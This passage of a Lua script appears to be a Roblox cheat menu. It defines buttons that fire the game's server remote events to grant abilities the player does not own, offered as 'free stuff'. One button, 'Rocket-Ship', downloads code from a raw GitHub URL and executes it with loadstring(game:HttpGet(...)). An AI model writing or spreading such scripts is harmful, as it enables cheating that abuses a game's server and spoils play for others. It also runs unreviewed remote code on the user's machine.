})

local Section = Tab:AddSection({
	Name = "</Free Stuff> - poor? broke? alright,"
})

Tab:AddLabel("if your a showcaser and have no slaps use this ig")
Tab:AddLabel("if your ALSO a showcaser check out the settings tab")

Tab:AddButton({
	Name = "Rhythm Explosion",
	Callback = function()
      		game:GetService("ReplicatedStorage").rhythmevent:FireServer("AoeExplosion",0)
  	end    
})

Tab:AddButton({
	Name = "Null's Ability",
	Callback = function()
      		game:GetService("ReplicatedStorage").NullAbility:FireServer()
  	end    
})

Tab:AddButton({
	Name = "Here Comes The Piano [Blasphemy]",
	Callback = function()
      		game:GetService("ReplicatedStorage").Piano:FireServer()
  	end    
})

Tab:AddLabel("Custom Abilitys For Free Lol")

Tab:AddButton({
	Name = "Rocket-Ship",
	Callback = function()
      		game:GetService("ReplicatedStorage").rhythmevent:FireServer("AoeExplosion",0)
              wait(0.01)
         loadstring(game:HttpGet('https://raw.githubusercontent.com/LoserGrape/flinger-roblox/main/chatgpt%20fart'))()
  	end    
})

Tab:AddButton({
	Name = "what",
	Callback = function()
